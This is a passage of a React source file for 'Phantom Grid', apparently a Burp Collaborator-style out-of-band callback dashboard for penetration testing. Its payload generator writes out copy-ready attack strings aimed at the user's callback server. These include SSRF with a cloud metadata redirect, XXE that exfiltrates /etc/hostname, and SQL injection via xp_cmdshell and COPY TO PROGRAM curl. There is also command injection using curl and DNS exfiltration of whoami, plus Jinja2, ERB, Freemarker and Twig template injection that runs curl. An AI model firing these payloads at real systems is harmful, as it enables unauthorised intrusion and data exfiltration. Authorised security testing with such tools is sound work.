import { useState, useEffect, useCallback, useReducer, useRef } from "react";

/* ═══════════════════════════════════════════════
   PHANTOM GRID — OOB Collaborator Dashboard
   Tactical Command Center UI
   ═══════════════════════════════════════════════ */

const uid = () => Math.random().toString(36).slice(2, 10);
const ts = () => new Date().toISOString();
const shortTime = (t) => {
  try { return new Date(t).toLocaleTimeString("en-GB", { hour12: false }); }
  catch { return t; }
};
const copyText = async (t) => { try { await navigator.clipboard.writeText(t); return true; } catch { return false; } };

/* ── Animated background grid canvas ── */
function GridCanvas() {
  const ref = useRef(null);
  useEffect(() => {
    const c = ref.current;
    if (!c) return;
    const ctx = c.getContext("2d");
    let animId;
    let tick = 0;
    const resize = () => { c.width = c.offsetWidth; c.height = c.offsetHeight; };
    resize();
    window.addEventListener("resize", resize);

    const draw = () => {
      tick++;
      ctx.clearRect(0, 0, c.width, c.height);
      const s = 40;
      ctx.strokeStyle = "rgba(0,255,170,0.04)";
      ctx.lineWidth = 0.5;
      for (let x = 0; x < c.width; x += s) {
        ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, c.height); ctx.stroke();
      }
      for (let y = 0; y < c.height; y += s) {
        ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(c.width, y); ctx.stroke();
      }
      // Scan line
      const sy = (tick * 0.7) % c.height;
      const grad = ctx.createLinearGradient(0, sy - 30, 0, sy + 30);
      grad.addColorStop(0, "rgba(0,255,170,0)");
      grad.addColorStop(0.5, "rgba(0,255,170,0.06)");
      grad.addColorStop(1, "rgba(0,255,170,0)");
      ctx.fillStyle = grad;
      ctx.fillRect(0, sy - 30, c.width, 60);

      // Pulsing dots at intersections
      if (tick % 3 === 0) {
        ctx.fillStyle = "rgba(0,255,170,0.12)";
        for (let i = 0; i < 5; i++) {
          const dx = Math.floor(Math.random() * (c.width / s)) * s;
          const dy = Math.floor(Math.random() * (c.height / s)) * s;
          ctx.beginPath(); ctx.arc(dx, dy, 1.5, 0, Math.PI * 2); ctx.fill();
        }
      }
      animId = requestAnimationFrame(draw);
    };
    draw();
    return () => { cancelAnimationFrame(animId); window.removeEventListener("resize", resize); };
  }, []);
  return <canvas ref={ref} style={{ position: "absolute", inset: 0, width: "100%", height: "100%", pointerEvents: "none", zIndex: 0 }} />;
}

/* ── Hex badge ── */
function HexBadge({ children, color = "var(--accent)", size = 28 }) {
  return (
    <div style={{
      width: size, height: size, position: "relative",
      display: "flex", alignItems: "center", justifyContent: "center",
      fontSize: size * 0.4, fontWeight: 900, color: "#000",
    }}>
      <svg viewBox="0 0 100 100" style={{ position: "absolute", inset: 0, width: "100%", height: "100%" }}>
        <polygon points="50,3 97,25 97,75 50,97 3,75 3,25" fill={color} opacity="0.9" />
        <polygon points="50,3 97,25 97,75 50,97 3,75 3,25" fill="none" stroke={color} strokeWidth="2" opacity="0.5" />
      </svg>
      <span style={{ position: "relative", zIndex: 1 }}>{children}</span>
    </div>
  );
}

/* ── Glow text ── */
function GlowText({ children, color = "var(--accent)", size = 12, ...rest }) {
  return (
    <span style={{
      color, fontSize: size, textShadow: `0 0 8px ${color}44, 0 0 20px ${color}22`,
      fontFamily: "var(--mono)", fontWeight: 700, ...rest,
    }}>{children}</span>
  );
}

/* ── Status indicator ── */
function StatusDot({ active = false, color }) {
  const c = color || (active ? "var(--accent)" : "var(--dim)");
  return (
    <span style={{
      display: "inline-block", width: 7, height: 7, borderRadius: "50%", background: c,
      boxShadow: active ? `0 0 6px ${c}, 0 0 12px ${c}44` : "none",
      animation: active ? "pulse 2s ease-in-out infinite" : "none",
    }} />
  );
}

/* ── Copy button ── */
function CopyBtn({ text, compact }) {
  const [ok, setOk] = useState(false);
  return (
    <button onClick={async () => { if (await copyText(text)) { setOk(true); setTimeout(() => setOk(false), 1200); } }}
      style={{
        background: ok ? "var(--accent)" : "rgba(0,255,170,0.08)",
        color: ok ? "#000" : "var(--accent)", border: `1px solid ${ok ? "var(--accent)" : "rgba(0,255,170,0.2)"}`,
        borderRadius: 3, padding: compact ? "2px 6px" : "3px 10px", cursor: "pointer",
        fontSize: 10, fontFamily: "var(--mono)", fontWeight: 600, transition: "all .2s",
        letterSpacing: 1, textTransform: "uppercase",
      }}>
      {ok ? "✓ COPIED" : "COPY"}
    </button>
  );
}

/* ── State ── */
const initialState = {
  serverUrl: "",
  connected: false,
  tokens: [],
  activeToken: null,
  tab: "monitor",
  log: [],
  polling: false,
};

function reducer(state, action) {
  switch (action.type) {
    case "SET_SERVER_URL": return { ...state, serverUrl: action.url };
    case "SET_CONNECTED": return { ...state, connected: action.val };
    case "SET_TOKENS": return { ...state, tokens: action.tokens };
    case "ADD_TOKEN": {
      const t = { id: uid(), label: action.label || `tkn-${state.tokens.length + 1}`, created: ts(), interactions: [], interaction_count: 0 };
      return { ...state, tokens: [t, ...state.tokens], activeToken: t.id };
    }
    case "SELECT_TOKEN": return { ...state, activeToken: action.id };
    case "DELETE_TOKEN": return {
      ...state, tokens: state.tokens.filter((t) => t.id !== action.id),
      activeToken: state.activeToken === action.id ? null : state.activeToken,
    };
    case "ADD_INTERACTION": {
      const tokens = state.tokens.map((t) =>
        t.id === action.tokenId
          ? { ...t, interactions: [{ ...action.data, time: ts(), rid: uid() }, ...t.interactions], interaction_count: t.interaction_count + 1 }
          : t
      );
      return { ...state, tokens, log: [{ tokenId: action.tokenId, ...action.data, time: ts() }, ...state.log].slice(0, 300) };
    }
    case "CLEAR_IX": {
      const tokens = state.tokens.map((t) => (t.id === action.tokenId ? { ...t, interactions: [], interaction_count: 0 } : t));
      return { ...state, tokens };
    }
    case "SET_TAB": return { ...state, tab: action.tab };
    case "SET_POLLING": return { ...state, polling: action.val };
    default: return state;
  }
}

/* ── Payload Templates ── */
const payloadTemplates = (base, token) => {
  const u = `${base || "http://<SERVER>:9090"}/c/${token}`;
  const h = (base || "<SERVER>").replace(/^https?:\/\//, "").replace(/:\d+$/, "");
  return [
    { cat: "HTTP CALLBACK", icon: "📡", items: [
      { n: "GET Request", p: u },
      { n: "cURL", p: `curl ${u}` },
      { n: "wget", p: `wget -q -O /dev/null ${u}` },
      { n: "PowerShell", p: `IWR -Uri ${u} -UseBasicParsing` },
      { n: "Python", p: `import requests; requests.get("${u}")` },
    ]},
    { cat: "SSRF", icon: "🎯", items: [
      { n: "Direct URL", p: u },
      { n: "URL-encoded", p: encodeURIComponent(u) },
      { n: "Double-encoded", p: encodeURIComponent(encodeURIComponent(u)) },
      { n: "With IMDS redirect", p: `${u}?next=http://169.254.169.254/latest/meta-data/` },
      { n: "Gopher", p: `gopher://${h}:80/_GET%20/c/${token}%20HTTP/1.0%0d%0a%0d%0a` },
    ]},
    { cat: "XXE", icon: "📄", items: [
      { n: "External Entity", p: `<?xml version="1.0"?>\n<!DOCTYPE r [\n  <!ENTITY xxe SYSTEM "${u}">\n]>\n<r>&xxe;</r>` },
      { n: "Parameter Entity (blind)", p: `<?xml version="1.0"?>\n<!DOCTYPE r [\n  <!ENTITY % xxe SYSTEM "${u}">\n  %xxe;\n]>` },
      { n: "OOB Exfiltration DTD", p: `<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; x SYSTEM '${u}?d=%file;'>">\n%eval;\n%x;` },
    ]},
    { cat: "SQL INJECTION OOB", icon: "💉", items: [
      { n: "Oracle UTL_HTTP", p: `'||(SELECT UTL_HTTP.REQUEST('${u}') FROM DUAL)||'` },
      { n: "MSSQL xp_dirtree", p: `'; EXEC master..xp_dirtree '\\\\${h}\\c\\${token}'--` },
      { n: "MySQL LOAD_FILE", p: `' UNION SELECT LOAD_FILE('\\\\\\\\${h}\\\\c\\\\${token}')-- -` },
      { n: "PostgreSQL COPY", p: `'; COPY (SELECT '') TO PROGRAM 'curl ${u}'--` },
      { n: "MSSQL xp_cmdshell", p: `'; EXEC xp_cmdshell 'curl ${u}'--` },
    ]},
    { cat: "COMMAND INJECTION", icon: "⚡", items: [
      { n: "Backtick", p: `\`curl ${u}\`` },
      { n: "$(…)", p: `$(curl ${u})` },
      { n: "Pipe", p: `| curl ${u}` },
      { n: "Semicolon", p: `; curl ${u} ;` },
      { n: "Newline", p: `%0acurl ${u}%0a` },
      { n: "DNS exfil (Linux)", p: `\`nslookup $(whoami).${token}.${h}\`` },
      { n: "DNS exfil (Windows)", p: `& nslookup %username%.${token}.${h} &` },
    ]},
    { cat: "DNS LOOKUP", icon: "🌐", items: [
      { n: "Subdomain", p: `${token}.${h}` },
      { n: "nslookup", p: `nslookup ${token}.${h}` },
      { n: "dig", p: `dig +short ${token}.${h}` },
      { n: "With data exfil", p: `$(cat /etc/hostname).${token}.${h}` },
    ]},
    { cat: "SSTI / TEMPLATE INJECTION", icon: "🧪", items: [
      { n: "Jinja2 / Python", p: `{{config.__class__.__init__.__globals__['os'].popen('curl ${u}').read()}}` },
      { n: "ERB / Ruby", p: `<%= \`curl ${u}\` %>` },
      { n: "Freemarker / Java", p: `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("curl ${u}")}` },
      { n: "Twig / PHP", p: `{{['curl ${u}']|filter('system')}}` },
    ]},
    { cat: "EMAIL / SMTP HEADER", icon: "✉️", items: [
      { n: "Header injection", p: `test@test.com%0d%0aBcc:callback@${h}` },
      { n: "IMAP/SMTP callback", p: `imaps://${h}:993/${token}` },
    ]},
  ];
};

/* ═══ MAIN APP ═══ */
export default function PhantomGrid() {
  const [state, dispatch] = useReducer(reducer, initialState);
  const [label, setLabel] = useState("");
  const [openCat, setOpenCat] = useState(null);
  const [flashToken, setFlashToken] = useState(null);
  const activeToken = state.tokens.find((t) => t.id === state.activeToken) || null;

  const totalHits = state.tokens.reduce((a, t) => a + (t.interaction_count || 0), 0);
  const httpHits = state.log.filter((l) => l.type === "HTTP").length;
  const dnsHits = state.log.filter((l) => l.type === "DNS").length;

  const simulate = (type) => {
    if (!activeToken) return;
    const ip = `${Math.floor(Math.random()*223)+1}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
    dispatch({
      type: "ADD_INTERACTION", tokenId: activeToken.id,
      data: {
        type, source_ip: ip,
        method: type === "HTTP" ? ["GET","POST","PUT"][Math.floor(Math.random()*3)] : undefined,
        path: type === "HTTP" ? `/c/${activeToken.id}` : undefined,
        query_name: type === "DNS" ? `${activeToken.id}.collaborator.example.com` : undefined,
        query_type: type === "DNS" ? "A" : undefined,
        headers: type === "HTTP" ? { "User-Agent": "curl/7.81.0", "Accept": "*/*", "Host": "collaborator" } : undefined,
        body: type === "HTTP" && Math.random() > 0.5 ? "exfiltrated_data=secret_value" : "",
      },
    });
    setFlashToken(activeToken.id);
    setTimeout(() => setFlashToken(null), 600);
  };

  const tabs = [
    { key: "monitor", label: "MONITOR", icon: "◉" },
    { key: "payloads", label: "PAYLOADS", icon: "⬡" },
    { key: "log", label: "SIGNAL LOG", icon: "▤" },
    { key: "setup", label: "DEPLOY", icon: "⚙" },
  ];

  return (
    <div style={{
      "--bg": "#05080d", "--surface1": "#0a1018", "--surface2": "#0f1720", "--surface3": "#141e2a",
      "--border": "rgba(0,255,170,0.1)", "--border2": "rgba(0,255,170,0.05)",
      "--fg": "#b8c9d4", "--dim": "#3d5565", "--accent": "#00ffaa", "--accent2": "#00ccff",
      "--red": "#ff3355", "--amber": "#ffaa00", "--purple": "#aa55ff",
      "--mono": "'IBM Plex Mono', 'Fira Code', 'Consolas', monospace",
      "--sans": "'IBM Plex Sans', 'Segoe UI', sans-serif",
      background: "var(--bg)", color: "var(--fg)", fontFamily: "var(--mono)",
      height: "100vh", display: "flex", flexDirection: "column", overflow: "hidden", position: "relative",
    }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600;700&family=IBM+Plex+Sans:wght@300;400;500;600;700&display=swap');
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
        @keyframes slideIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes borderGlow { 0%,100% { border-color: rgba(0,255,170,0.15); } 50% { border-color: rgba(0,255,170,0.4); } }
        @keyframes flashHit { 0% { background: rgba(0,255,170,0.2); } 100% { background: transparent; } }
        * { scrollbar-width: thin; scrollbar-color: rgba(0,255,170,0.15) transparent; }
        *::-webkit-scrollbar { width: 5px; }
        *::-webkit-scrollbar-track { background: transparent; }
        *::-webkit-scrollbar-thumb { background: rgba(0,255,170,0.15); border-radius: 3px; }
      `}</style>
      <GridCanvas />

      {/* ══ HEADER ══ */}
      <div style={{
        position: "relative", zIndex: 1, padding: "10px 20px",
        borderBottom: "1px solid var(--border)", background: "rgba(5,8,13,0.9)",
        display: "flex", alignItems: "center", gap: 16,
        backdropFilter: "blur(10px)",
      }}>
        <HexBadge color="var(--accent)" size={34}>P</HexBadge>
        <div>
          <div style={{ fontSize: 15, fontWeight: 700, letterSpacing: 4, fontFamily: "var(--sans)", color: "var(--accent)", textTransform: "uppercase" }}>
            Phantom Grid
          </div>
          <div style={{ fontSize: 9, color: "var(--dim)", letterSpacing: 3, textTransform: "uppercase" }}>
            Out-of-Band Interaction Command Center
          </div>
        </div>
        <div style={{ flex: 1 }} />

        {/* Status indicators */}
        <div style={{ display: "flex", gap: 20, alignItems: "center" }}>
          <div style={{ textAlign: "center" }}>
            <div style={{ fontSize: 18, fontWeight: 700, color: "var(--accent)" }}>{state.tokens.length}</div>
            <div style={{ fontSize: 8, color: "var(--dim)", letterSpacing: 2 }}>TOKENS</div>
          </div>
          <div style={{ width: 1, height: 28, background: "var(--border)" }} />
          <div style={{ textAlign: "center" }}>
            <div style={{ fontSize: 18, fontWeight: 700, color: "var(--accent2)" }}>{totalHits}</div>
            <div style={{ fontSize: 8, color: "var(--dim)", letterSpacing: 2 }}>CAPTURES</div>
          </div>
          <div style={{ width: 1, height: 28, background: "var(--border)" }} />
          <div style={{ display: "flex", gap: 10 }}>
            <div style={{ textAlign: "center" }}>
              <div style={{ fontSize: 13, fontWeight: 600, color: "#4fc3f7" }}>{httpHits}</div>
              <div style={{ fontSize: 7, color: "var(--dim)", letterSpacing: 1 }}>HTTP</div>
            </div>
            <div style={{ textAlign: "center" }}>
              <div style={{ fontSize: 13, fontWeight: 600, color: "var(--purple)" }}>{dnsHits}</div>
              <div style={{ fontSize: 7, color: "var(--dim)", letterSpacing: 1 }}>DNS</div>
            </div>
          </div>
          <div style={{ width: 1, height: 28, background: "var(--border)" }} />
          <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
            <StatusDot active={state.connected} />
            <span style={{ fontSize: 9, color: state.connected ? "var(--accent)" : "var(--dim)", letterSpacing: 1 }}>
              {state.connected ? "LINKED" : "LOCAL"}
            </span>
          </div>
        </div>
      </div>

      {/* ══ TAB BAR ══ */}
      <div style={{
        position: "relative", zIndex: 1, display: "flex", borderBottom: "1px solid var(--border)",
        background: "rgba(10,16,24,0.8)", backdropFilter: "blur(8px)",
      }}>
        {tabs.map((t) => (
          <div key={t.key} onClick={() => dispatch({ type: "SET_TAB", tab: t.key })} style={{
            padding: "9px 24px", cursor: "pointer", fontSize: 10, fontWeight: state.tab === t.key ? 700 : 400,
            letterSpacing: 2, color: state.tab === t.key ? "var(--accent)" : "var(--dim)",
            borderBottom: state.tab === t.key ? "2px solid var(--accent)" : "2px solid transparent",
            background: state.tab === t.key ? "rgba(0,255,170,0.03)" : "transparent",
            transition: "all .2s", display: "flex", alignItems: "center", gap: 6,
          }}>
            <span style={{ fontSize: 12 }}>{t.icon}</span> {t.label}
          </div>
        ))}
      </div>

      {/* ══ BODY ══ */}
      <div style={{ flex: 1, display: "flex", overflow: "hidden", position: "relative", zIndex: 1 }}>

        {/* ── LEFT: TOKEN PANEL ── */}
        <div style={{
          width: 240, minWidth: 240, borderRight: "1px solid var(--border)",
          background: "rgba(10,16,24,0.6)", display: "flex", flexDirection: "column",
          backdropFilter: "blur(6px)",
        }}>
          <div style={{ padding: "12px", borderBottom: "1px solid var(--border2)" }}>
            <div style={{ fontSize: 9, letterSpacing: 3, color: "var(--dim)", marginBottom: 8, textTransform: "uppercase" }}>
              ⬡ Active Tokens
            </div>
            <div style={{ display: "flex", gap: 4 }}>
              <input value={label} onChange={(e) => setLabel(e.target.value)}
                onKeyDown={(e) => { if (e.key === "Enter") { dispatch({ type: "ADD_TOKEN", label: label.trim() || undefined }); setLabel(""); }}}
                placeholder="token label…"
                style={{
                  flex: 1, background: "rgba(0,255,170,0.03)", border: "1px solid var(--border)",
                  borderRadius: 3, padding: "6px 8px", color: "var(--fg)", fontSize: 11,
                  fontFamily: "var(--mono)", outline: "none",
                }}
              />
              <button onClick={() => { dispatch({ type: "ADD_TOKEN", label: label.trim() || undefined }); setLabel(""); }}
                style={{
                  background: "var(--accent)", color: "#000", border: "none", borderRadius: 3,
                  padding: "6px 12px", cursor: "pointer", fontWeight: 800, fontSize: 14, lineHeight: 1,
                }}>+</button>
            </div>
          </div>
          <div style={{ flex: 1, overflowY: "auto", padding: "4px 0" }}>
            {state.tokens.length === 0 && (
              <div style={{ padding: 20, textAlign: "center", color: "var(--dim)", fontSize: 10, lineHeight: 1.8 }}>
                No active tokens.<br />Create one to begin<br />capturing interactions.
              </div>
            )}
            {state.tokens.map((t) => (
              <div key={t.id} onClick={() => dispatch({ type: "SELECT_TOKEN", id: t.id })}
                style={{
                  padding: "10px 12px", cursor: "pointer",
                  borderLeft: t.id === state.activeToken ? "3px solid var(--accent)" : "3px solid transparent",
                  background: t.id === state.activeToken ? "rgba(0,255,170,0.06)" : flashToken === t.id ? "rgba(0,255,170,0.15)" : "transparent",
                  transition: "all .2s", animation: flashToken === t.id ? "flashHit 0.6s ease-out" : "none",
                }}>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                  <span style={{ fontSize: 12, fontWeight: t.id === state.activeToken ? 700 : 400, color: t.id === state.activeToken ? "var(--accent)" : "var(--fg)" }}>
                    {t.label}
                  </span>
                  {t.interaction_count > 0 && (
                    <span style={{
                      background: "var(--accent)", color: "#000", borderRadius: 8,
                      padding: "1px 6px", fontSize: 9, fontWeight: 800,
                    }}>{t.interaction_count}</span>
                  )}
                </div>
                <div style={{ fontSize: 9, color: "var(--dim)", marginTop: 3 }}>
                  {t.id} · {shortTime(t.created)}
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* ── RIGHT: MAIN PANEL ── */}
        <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>

          {/* ═══ MONITOR TAB ═══ */}
          {state.tab === "monitor" && (
            activeToken ? (
              <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
                {/* Token header */}
                <div style={{
                  padding: "10px 16px", borderBottom: "1px solid var(--border)",
                  display: "flex", alignItems: "center", gap: 10, flexWrap: "wrap",
                  background: "rgba(0,255,170,0.02)",
                }}>
                  <HexBadge size={24}>{activeToken.label[0]?.toUpperCase()}</HexBadge>
                  <GlowText size={14}>{activeToken.label}</GlowText>
                  <span style={{ fontSize: 10, color: "var(--dim)", padding: "2px 8px", border: "1px solid var(--border)", borderRadius: 3 }}>
                    {activeToken.id}
                  </span>
                  <CopyBtn text={activeToken.id} compact />
                  <div style={{ flex: 1 }} />
                  {[
                    { label: "SIM HTTP", color: "#4fc3f7", fn: () => simulate("HTTP") },
                    { label: "SIM DNS", color: "var(--purple)", fn: () => simulate("DNS") },
                    { label: "CLEAR", color: "var(--amber)", fn: () => dispatch({ type: "CLEAR_IX", tokenId: activeToken.id }) },
                    { label: "DELETE", color: "var(--red)", fn: () => dispatch({ type: "DELETE_TOKEN", id: activeToken.id }) },
                  ].map((b) => (
                    <button key={b.label} onClick={b.fn} style={{
                      background: "transparent", border: `1px solid ${b.color}33`, color: b.color,
                      borderRadius: 3, padding: "3px 10px", cursor: "pointer", fontSize: 9,
                      fontFamily: "var(--mono)", fontWeight: 600, letterSpacing: 1,
                      transition: "all .2s",
                    }}>{b.label}</button>
                  ))}
                </div>
                {/* Interactions */}
                <div style={{ flex: 1, overflowY: "auto", padding: 12 }}>
                  {activeToken.interactions.length === 0 && (
                    <div style={{ textAlign: "center", color: "var(--dim)", marginTop: 60, fontSize: 11, lineHeight: 2 }}>
                      <div style={{ fontSize: 32, marginBottom: 8, opacity: 0.3 }}>◎</div>
                      Awaiting incoming interactions…<br />
                      Deploy payloads from the <span style={{ color: "var(--accent)" }}>PAYLOADS</span> tab<br />
                      and watch callbacks appear here in real-time.<br />
                      <span style={{ fontSize: 10, color: "var(--dim)" }}>Use SIM buttons above to test the UI.</span>
                    </div>
                  )}
                  {activeToken.interactions.map((ix, i) => (
                    <div key={ix.rid || i} style={{
                      background: "var(--surface2)", borderRadius: 4, padding: "10px 14px", marginBottom: 6,
                      borderLeft: `3px solid ${ix.type === "HTTP" ? "#4fc3f7" : "var(--purple)"}`,
                      animation: "slideIn 0.3s ease-out",
                    }}>
                      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
                        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                          <span style={{
                            fontSize: 9, fontWeight: 800, letterSpacing: 2, padding: "2px 6px", borderRadius: 2,
                            background: ix.type === "HTTP" ? "rgba(79,195,247,0.15)" : "rgba(170,85,255,0.15)",
                            color: ix.type === "HTTP" ? "#4fc3f7" : "var(--purple)",
                          }}>{ix.type}</span>
                          {ix.method && <span style={{ fontSize: 10, fontWeight: 700, color: "var(--accent2)" }}>{ix.method}</span>}
                          {ix.query_type && <span style={{ fontSize: 10, color: "var(--amber)" }}>{ix.query_type}</span>}
                        </div>
                        <span style={{ fontSize: 9, color: "var(--dim)" }}>{shortTime(ix.time)}</span>
                      </div>
                      <div style={{ fontSize: 10, color: "var(--dim)", marginBottom: 4 }}>
                        <span style={{ color: "var(--fg)" }}>SRC</span> {ix.source_ip}
                        {ix.path && <> · <span style={{ color: "var(--fg)" }}>PATH</span> {ix.path}</>}
                        {ix.query_name && <> · <span style={{ color: "var(--fg)" }}>QNAME</span> {ix.query_name}</>}
                      </div>
                      {ix.headers && (
                        <details style={{ marginTop: 4 }}>
                          <summary style={{ fontSize: 9, color: "var(--dim)", cursor: "pointer", letterSpacing: 1 }}>HEADERS</summary>
                          <pre style={{ fontSize: 10, color: "var(--fg)", background: "var(--surface1)", padding: 8, borderRadius: 3, margin: "4px 0 0", whiteSpace: "pre-wrap", overflowX: "auto" }}>
                            {Object.entries(ix.headers).map(([k,v]) => `${k}: ${v}`).join("\n")}
                          </pre>
                        </details>
                      )}
                      {ix.body && (
                        <details style={{ marginTop: 4 }}>
                          <summary style={{ fontSize: 9, color: "var(--dim)", cursor: "pointer", letterSpacing: 1 }}>BODY</summary>
                          <pre style={{ fontSize: 10, color: "var(--accent)", background: "var(--surface1)", padding: 8, borderRadius: 3, margin: "4px 0 0", whiteSpace: "pre-wrap" }}>
                            {ix.body}
                          </pre>
                        </details>
                      )}
                      {ix.exfil_data && (
                        <div style={{ marginTop: 4, padding: "4px 8px", background: "rgba(255,170,0,0.08)", borderRadius: 3, fontSize: 10, color: "var(--amber)" }}>
                          EXFIL DATA: {ix.exfil_data}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 12 }}>
                <div style={{ fontSize: 48, opacity: 0.15 }}>⬡</div>
                <div style={{ fontSize: 11, color: "var(--dim)", letterSpacing: 2 }}>SELECT OR CREATE A TOKEN</div>
              </div>
            )
          )}

          {/* ═══ PAYLOADS TAB ═══ */}
          {state.tab === "payloads" && (
            <div style={{ flex: 1, overflowY: "auto", padding: 16 }}>
              {/* Server URL config */}
              <div style={{ marginBottom: 16, padding: 12, background: "var(--surface2)", borderRadius: 4, border: "1px solid var(--border)" }}>
                <div style={{ fontSize: 9, letterSpacing: 3, color: "var(--dim)", marginBottom: 6, textTransform: "uppercase" }}>⚙ Server Base URL</div>
                <input value={state.serverUrl} onChange={(e) => dispatch({ type: "SET_SERVER_URL", url: e.target.value })}
                  placeholder="http://your-vps-ip:9090"
                  style={{
                    width: "100%", background: "var(--surface1)", border: "1px solid var(--border)",
                    borderRadius: 3, padding: "8px 10px", color: "var(--accent)", fontSize: 12,
                    fontFamily: "var(--mono)", outline: "none", boxSizing: "border-box",
                  }}
                />
              </div>
              {!activeToken && (
                <div style={{ textAlign: "center", color: "var(--dim)", padding: 30, fontSize: 11 }}>
                  Select a token to generate targeted payloads.
                </div>
              )}
              {activeToken && payloadTemplates(state.serverUrl, activeToken.id).map((cat) => (
                <div key={cat.cat} style={{ marginBottom: 4 }}>
                  <div onClick={() => setOpenCat(openCat === cat.cat ? null : cat.cat)} style={{
                    padding: "9px 12px", background: "var(--surface2)", borderRadius: 3, cursor: "pointer",
                    display: "flex", alignItems: "center", gap: 8,
                    borderLeft: openCat === cat.cat ? "3px solid var(--accent)" : "3px solid transparent",
                    transition: "all .15s",
                  }}>
                    <span style={{ fontSize: 14 }}>{cat.icon}</span>
                    <span style={{ fontSize: 11, fontWeight: 600, letterSpacing: 1, color: openCat === cat.cat ? "var(--accent)" : "var(--fg)" }}>
                      {cat.cat}
                    </span>
                    <span style={{ fontSize: 9, color: "var(--dim)" }}>({cat.items.length})</span>
                    <div style={{ flex: 1 }} />
                    <span style={{ fontSize: 9, color: "var(--dim)", transition: "transform .2s", transform: openCat === cat.cat ? "rotate(90deg)" : "none" }}>▶</span>
                  </div>
                  {openCat === cat.cat && (
                    <div style={{ padding: "6px 0 6px 16px" }}>
                      {cat.items.map((it) => (
                        <div key={it.n} style={{
                          marginBottom: 6, background: "var(--surface1)", borderRadius: 3, padding: "8px 10px",
                          border: "1px solid var(--border2)",
                        }}>
                          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 5 }}>
                            <span style={{ fontSize: 10, fontWeight: 600, color: "var(--fg)", letterSpacing: 0.5 }}>{it.n}</span>
                            <CopyBtn text={it.p} compact />
                          </div>
                          <pre style={{
                            margin: 0, fontSize: 10, color: "var(--accent)", whiteSpace: "pre-wrap",
                            wordBreak: "break-all", lineHeight: 1.6, opacity: 0.85,
                          }}>{it.p}</pre>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}

          {/* ═══ LOG TAB ═══ */}
          {state.tab === "log" && (
            <div style={{ flex: 1, overflowY: "auto", padding: 0 }}>
              <div style={{
                padding: "8px 16px", borderBottom: "1px solid var(--border)", background: "var(--surface2)",
                fontSize: 9, letterSpacing: 3, color: "var(--dim)", display: "flex", gap: 16,
              }}>
                <span style={{ width: 50 }}>TYPE</span>
                <span style={{ width: 70 }}>TIME</span>
                <span style={{ width: 130 }}>SOURCE</span>
                <span style={{ width: 100 }}>TOKEN</span>
                <span style={{ flex: 1 }}>DETAIL</span>
              </div>
              {state.log.length === 0 && (
                <div style={{ textAlign: "center", color: "var(--dim)", padding: 40, fontSize: 11 }}>Signal log empty.</div>
              )}
              {state.log.map((l, i) => (
                <div key={i} style={{
                  padding: "6px 16px", borderBottom: "1px solid var(--border2)", fontSize: 10,
                  display: "flex", gap: 16, alignItems: "center",
                  animation: i === 0 ? "slideIn 0.3s ease-out" : "none",
                }}>
                  <span style={{
                    width: 50, fontWeight: 700, fontSize: 9, letterSpacing: 1,
                    color: l.type === "HTTP" ? "#4fc3f7" : "var(--purple)",
                  }}>{l.type}</span>
                  <span style={{ width: 70, color: "var(--dim)" }}>{shortTime(l.time)}</span>
                  <span style={{ width: 130, color: "var(--fg)" }}>{l.source_ip}</span>
                  <span style={{ width: 100, color: "var(--accent)" }}>{l.tokenId}</span>
                  <span style={{ flex: 1, color: "var(--dim)", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                    {l.method || ""} {l.path || l.query_name || ""}
                  </span>
                </div>
              ))}
            </div>
          )}

          {/* ═══ SETUP / DEPLOY TAB ═══ */}
          {state.tab === "setup" && (
            <div style={{ flex: 1, overflowY: "auto", padding: 20 }}>
              <GlowText size={16}>Server Deployment Guide</GlowText>
              <div style={{ marginTop: 16, display: "flex", flexDirection: "column", gap: 12 }}>
                {[
                  { step: "01", title: "Install Dependencies", code: "pip install flask flask-cors" },
                  { step: "02", title: "Run HTTP Server", code: "python server.py --port 9090" },
                  { step: "03", title: "Run with DNS (requires root)", code: "sudo python server.py --dns --port 9090" },
                  { step: "04", title: "Expose via ngrok (for labs)", code: "ngrok http 9090" },
                  { step: "05", title: "Or use a VPS with public IP", code: "# On VPS:\nsudo python server.py --dns --port 80\n\n# Set DNS NS record:\n# ns1.yourdomain.com → your VPS IP\n# Then subdomains like TOKEN.yourdomain.com\n# will be captured by the DNS server" },
                  { step: "06", title: "Configure this dashboard", code: `Set "Server Base URL" in the PAYLOADS tab\nto your server's public URL.\n\nAll payload templates auto-update\nwith your server address.` },
                ].map((s) => (
                  <div key={s.step} style={{
                    background: "var(--surface2)", borderRadius: 4, padding: "12px 14px",
                    border: "1px solid var(--border)",
                  }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 8 }}>
                      <HexBadge size={22} color="var(--accent2)">{s.step}</HexBadge>
                      <span style={{ fontSize: 12, fontWeight: 600, letterSpacing: 1, color: "var(--fg)", fontFamily: "var(--sans)" }}>{s.title}</span>
                      <div style={{ flex: 1 }} />
                      <CopyBtn text={s.code} compact />
                    </div>
                    <pre style={{
                      margin: 0, fontSize: 11, color: "var(--accent)", whiteSpace: "pre-wrap",
                      background: "var(--surface1)", padding: 10, borderRadius: 3, lineHeight: 1.6,
                    }}>{s.code}</pre>
                  </div>
                ))}

                <div style={{
                  marginTop: 8, padding: 14, background: "rgba(255,170,0,0.05)",
